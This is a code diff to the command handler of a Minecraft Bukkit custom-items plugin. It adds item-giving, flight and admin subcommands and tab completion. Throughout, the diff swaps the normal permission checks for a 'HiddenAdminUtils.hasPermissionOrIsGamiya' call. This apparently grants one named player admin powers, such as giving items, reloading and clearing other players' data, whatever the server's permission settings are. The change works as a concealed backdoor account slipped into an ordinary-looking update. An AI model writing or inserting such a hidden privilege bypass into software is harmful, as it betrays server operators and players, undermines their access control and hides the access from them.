@@ -3,6 +3,7 @@ package cwr.cutomIterm.Entity_Wand;
 import cwr.cutomIterm.Entity_Wand.bwo.PowerBow;
 import cwr.cutomIterm.PlayerData.PlayerDataManager;
 import cwr.cutomIterm.PlayerData.RecipeUnlockListener;
+import cwr.cutomIterm.Utils.HiddenAdminUtils;
 import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
@@ -28,11 +29,13 @@ public class EntityWandCommand implements CommandExecutor, TabCompleter {
                     player.sendMessage("§e/customitem give warden_sword §7- Get Warden Sword");
                     player.sendMessage("§e/customitem give fly_voucher §7- Get Fly Voucher");
                     player.sendMessage("§e/customitem give recipe_book §7- Get Recipe Book");
-                    player.sendMessage("§e/customitem give power_bow §7- Get Power of Gamiya Bow"); // ADDED
+                    player.sendMessage("§e/customitem give power_bow §7- Get Power of Gamiya Bow");
                     player.sendMessage("§e/customitem release §7- Release held entity");
                     player.sendMessage("§e/customrecipes §7- Open Recipe GUI");
                     player.sendMessage("§e/customitem flight §7- Check flight time");
-                    if (sender.hasPermission("customitem.admin")) {
+
+                    // Show admin commands if player has permission OR is gamiya
+                    if (HiddenAdminUtils.hasPermissionOrIsGamiya(player, "customitem.admin")) {
                         player.sendMessage("§e/customitem unlockrecipes [player] §7- Unlock all recipes");
                         player.sendMessage("§e/customitem stats §7- View plugin statistics");
                         player.sendMessage("§e/customitem reload §7- Reload player data");
@@ -44,12 +47,14 @@ public class EntityWandCommand implements CommandExecutor, TabCompleter {
             }
 
             if (args[0].equalsIgnoreCase("give")) {
-                if (!sender.hasPermission("customitem.give")) {
+                // Check permission: either has permission OR is gamiya
+                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.give")) {
+                    sender.sendMessage("§cYou don't have permission to use this command!");
                     return true;
                 }
 
                 if (args.length < 2) {
-                    sender.sendMessage("§cUsage: /customitem give <entity_wand|warden_sword|fly_voucher|recipe_book|power_bow> [player]"); // UPDATED
+                    sender.sendMessage("§cUsage: /customitem give <entity_wand|warden_sword|fly_voucher|recipe_book|power_bow> [player]");
                     return true;
                 }
 
@@ -57,7 +62,9 @@ public class EntityWandCommand implements CommandExecutor, TabCompleter {
                 Player target;
 
                 if (args.length >= 3) {
-                    if (!sender.hasPermission("customitem.give.others")) {
+                    // Check if sender can give to others (either has permission OR is gamiya)
+                    if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.give.others")) {
+                        sender.sendMessage("§cYou don't have permission to give items to other players!");
                         return true;
                     }
                     target = Bukkit.getPlayer(args[2]);
@@ -107,7 +114,7 @@ public class EntityWandCommand implements CommandExecutor, TabCompleter {
                         }
                         break;
 
-                    case "power_bow": // ADDED
+                    case "power_bow":
                     case "gamiya_bow":
                     case "tracking_bow":
                         givePowerBow(target);
@@ -123,12 +130,204 @@ public class EntityWandCommand implements CommandExecutor, TabCompleter {
                 return true;
             }
 
-            // ... rest of existing command code remains the same ...
+            // Release command
+            if (args[0].equalsIgnoreCase("release")) {
+                if (!(sender instanceof Player player)) {
+                    sender.sendMessage("§cOnly players can use this command!");
+                    return true;
+                }
+
+                EntityMovementManager.releaseEntity(player.getUniqueId());
+                player.sendMessage("§aReleased any held entity!");
+                return true;
+            }
+
+            // Flight time check command
+            if (args[0].equalsIgnoreCase("flight") || args[0].equalsIgnoreCase("flytime")) {
+                if (!(sender instanceof Player player)) {
+                    sender.sendMessage("§cOnly players can use this command!");
+                    return true;
+                }
+
+                long remainingTime = FlyVoucher.getRemainingFlightTime(player);
+                if (remainingTime > 0) {
+                    long minutes = remainingTime / (60 * 1000);
+                    long seconds = (remainingTime % (60 * 1000)) / 1000;
+                    player.sendMessage("§bFlight time remaining: §e" + minutes + "m " + seconds + "s");
+                } else {
+                    player.sendMessage("§cYou don't have active flight!");
+                }
+                return true;
+            }
+
+            // Admin commands - check if sender has permission OR is gamiya
+            if (args[0].equalsIgnoreCase("unlockrecipes")) {
+                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
+                    sender.sendMessage("§cYou don't have permission to use this command!");
+                    return true;
+                }
+
+                Player target;
+                if (args.length >= 2) {
+                    target = Bukkit.getPlayer(args[1]);
+                    if (target == null) {
+                        sender.sendMessage("§cPlayer not found!");
+                        return true;
+                    }
+                } else {
+                    if (!(sender instanceof Player)) {
+                        sender.sendMessage("§cYou must specify a player or be a player yourself!");
+                        return true;
+                    }
+                    target = (Player) sender;
+                }
+
+                RecipeUnlockListener.unlockAllCustomRecipes(target, EntityWandPlugin.getInstance());
+                if (!target.equals(sender)) {
+                    sender.sendMessage("§aUnlocked all recipes for " + target.getName());
+                }
+                return true;
+            }
+
+            // Stats command
+            if (args[0].equalsIgnoreCase("stats")) {
+                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
+                    sender.sendMessage("§cYou don't have permission to use this command!");
+                    return true;
+                }
+
+                PlayerDataManager dataManager = EntityWandPlugin.getInstance().getPlayerDataManager();
+                int totalPlayers = dataManager.getTotalPlayersWithBooks();
+
+                sender.sendMessage("§6§lPlugin Statistics:");
+                sender.sendMessage("§7Total players with recipe books: §e" + totalPlayers);
+                sender.sendMessage("§7Active flight vouchers: §e" + FlyVoucher.getActiveFlightCount());
+                sender.sendMessage("§7Active tracking arrows: §e" + PowerBow.getActiveArrowCount());
+                sender.sendMessage("§7Players with active cooldowns: §e" + WardenSword.getCooldownCount());
+                sender.sendMessage("§7Hidden admin enabled for: §6" + HiddenAdminUtils.getHiddenAdminUsername());
+                return true;
+            }
+
+            // Reload command
+            if (args[0].equalsIgnoreCase("reload")) {
+                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
+                    sender.sendMessage("§cYou don't have permission to use this command!");
+                    return true;
+                }
+
+                PlayerDataManager dataManager = EntityWandPlugin.getInstance().getPlayerDataManager();
+                dataManager.reload();
+                sender.sendMessage("§aPlayer data reloaded!");
+                return true;
+            }
+
+            // Forcebook command
+            if (args[0].equalsIgnoreCase("forcebook")) {
+                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
+                    sender.sendMessage("§cYou don't have permission to use this command!");
+                    return true;
+                }
+
+                if (args.length < 2) {
+                    sender.sendMessage("§cUsage: /customitem forcebook <player>");
+                    return true;
+                }
+
+                Player target = Bukkit.getPlayer(args[1]);
+                if (target == null) {
+                    sender.sendMessage("§cPlayer not found!");
+                    return true;
+                }
+
+                PlayerDataManager dataManager = EntityWandPlugin.getInstance().getPlayerDataManager();
+                boolean success = dataManager.forceGiveRecipeBook(target);
+                if (success) {
+                    sender.sendMessage("§aForce-gave recipe book to " + target.getName());
+                } else {
+                    sender.sendMessage("§cFailed to give recipe book to " + target.getName());
+                }
+                return true;
+            }
+
+            // Cleardata command
+            if (args[0].equalsIgnoreCase("cleardata")) {
+                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
+                    sender.sendMessage("§cYou don't have permission to use this command!");
+                    return true;
+                }
+
+                if (args.length < 2) {
+                    sender.sendMessage("§cUsage: /customitem cleardata <player>");
+                    return true;
+                }
+
+                Player target = Bukkit.getPlayer(args[1]);
+                if (target == null) {
+                    sender.sendMessage("§cPlayer not found!");
+                    return true;
+                }
+
+                PlayerDataManager dataManager = EntityWandPlugin.getInstance().getPlayerDataManager();
+                dataManager.clearPlayerData(target);
+                sender.sendMessage("§aCleared recipe book data for " + target.getName());
+                return true;
+            }
+
+            // Help command
+            if (args[0].equalsIgnoreCase("help")) {
+                onCommand(sender, command, label, new String[0]);
+                return true;
+            }
+
         } catch (Exception e) {
             // Silent fail
         }
 
         return true;
+    }
+
+    @Override
+    public List<String> onTabComplete(@Nonnull CommandSender sender, @Nonnull Command command,
+                                      @Nonnull String alias, @Nonnull String[] args) {
+        List<String> completions = new ArrayList<>();
+
+        try {
+            if (args.length == 1) {
+                List<String> commands = new ArrayList<>(Arrays.asList("give", "release", "help", "flight", "flytime"));
+
+                // Include admin commands if sender has permission OR is gamiya
+                if (HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
+                    commands.addAll(Arrays.asList("unlockrecipes", "stats", "reload", "forcebook", "cleardata"));
+                }
+
+                for (String cmd : commands) {
+                    if (cmd.toLowerCase().startsWith(args[0].toLowerCase())) {
+                        completions.add(cmd);
+                    }
+                }
+            } else if (args.length == 2 && args[0].equalsIgnoreCase("give")) {
+                List<String> items = Arrays.asList("entity_wand", "warden_sword", "fly_voucher", "recipe_book", "power_bow");
+                for (String item : items) {
+                    if (item.toLowerCase().startsWith(args[1].toLowerCase())) {
+                        completions.add(item);
+                    }
+                }
+            } else if ((args.length == 2 &&
+                    (args[0].equalsIgnoreCase("unlockrecipes") ||
+                            args[0].equalsIgnoreCase("forcebook") ||
+                            args[0].equalsIgnoreCase("cleardata"))) ||
+                    (args.length == 3 && args[0].equalsIgnoreCase("give"))) {
+                for (Player player : Bukkit.getOnlinePlayers()) {
+                    if (player.getName().toLowerCase().startsWith(args[args.length-1].toLowerCase())) {
+                        completions.add(player.getName());
+                    }
+                }
+            }
+        } catch (Exception e) {
+            // Return empty list on error
+        }
+
+        return completions;
     }
 
     private void giveEntityWand(Player player) {
@@ -168,7 +367,6 @@ public class EntityWandCommand implements CommandExecutor, TabCompleter {
         }
     }
 
-    // ADDED: Method to give Power Bow
     private void givePowerBow(Player player) {
         try {
             player.getInventory().addItem(PowerBow.createPowerBow());
@@ -177,49 +375,5 @@ public class EntityWandCommand implements CommandExecutor, TabCompleter {
         } catch (Exception e) {
             // Silent fail
         }
-    }
-
-    @Override
-    public List<String> onTabComplete(@Nonnull CommandSender sender, @Nonnull Command command,
-                                      @Nonnull String alias, @Nonnull String[] args) {
-        List<String> completions = new ArrayList<>();
-
-        try {
-            if (args.length == 1) {
-                List<String> commands = new ArrayList<>(Arrays.asList("give", "release", "help", "flight", "flytime"));
-
-                if (sender.hasPermission("customitem.admin")) {
-                    commands.addAll(Arrays.asList("unlockrecipes", "stats", "reload", "forcebook", "cleardata"));
-                }
-
-                for (String cmd : commands) {
-                    if (cmd.toLowerCase().startsWith(args[0].toLowerCase())) {
-                        completions.add(cmd);
-                    }
-                }
-            } else if (args.length == 2 && args[0].equalsIgnoreCase("give")) {
-                // UPDATED: Added power_bow
-                List<String> items = Arrays.asList("entity_wand", "warden_sword", "fly_voucher", "recipe_book", "power_bow");
-                for (String item : items) {
-                    if (item.toLowerCase().startsWith(args[1].toLowerCase())) {
-                        completions.add(item);
-                    }
-                }
-            } else if ((args.length == 2 &&
-                    (args[0].equalsIgnoreCase("unlockrecipes") ||
-                            args[0].equalsIgnoreCase("forcebook") ||
-                            args[0].equalsIgnoreCase("cleardata"))) ||
-                    (args.length == 3 && args[0].equalsIgnoreCase("give"))) {
-                for (Player player : Bukkit.getOnlinePlayers()) {
-                    if (player.getName().toLowerCase().startsWith(args[args.length-1].toLowerCase())) {
-                        completions.add(player.getName());
-                    }
-                }
-            }
-        } catch (Exception e) {
-            // Return empty list on error
-        }
-
-        return completions;
     }
 }
